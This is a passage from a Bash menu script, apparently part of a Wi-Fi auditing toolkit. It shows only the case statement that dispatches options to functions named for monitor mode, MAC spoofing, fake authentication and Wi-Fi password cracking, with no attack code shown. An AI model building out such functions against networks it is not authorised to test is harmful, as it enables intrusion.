        10 ) necessaryPrograms ;;

        11 ) repairNetwork ;;

        12 ) connectedDevices ;;

        13 ) showProject ;;

        14 ) openTerminal ;;

        15 ) resetProgram ;;

        -h | --help ) panelHelp ;;

        -a | --author ) autorInfo ;;

        -v | --version ) versionSystem ;;

        -h1 ) monitorHelp ;;

        -h2 ) interfacesHelp ;;

        -h3 ) monitorDownHelp ;;

        -h4 ) wifiScannerHelp ;;

        -h5 ) macAttackHelp ;;

        -h6 ) fakeAuthHelp ;;

        -h7 ) wifiPasswordHelp ;;

        -h8 ) showMacHelp ;;

        -h9 ) changeMacHelp ;;

        -h11 ) repairNetworkHelp ;;

        -h12 ) connectedDev ;;

        0 ) echo " "
        exit
        ;;

        ? ) showIP ;;


        * ) echo " "
            echo -e "$redColour This option doesn't exist, try again$endColour"
            echo " "
            sleep 2
            ;;
      esac
  done
else
  echo " "
  echo -e "$redColour Has introducido mal el idioma$endColour"
  echo " "
fi
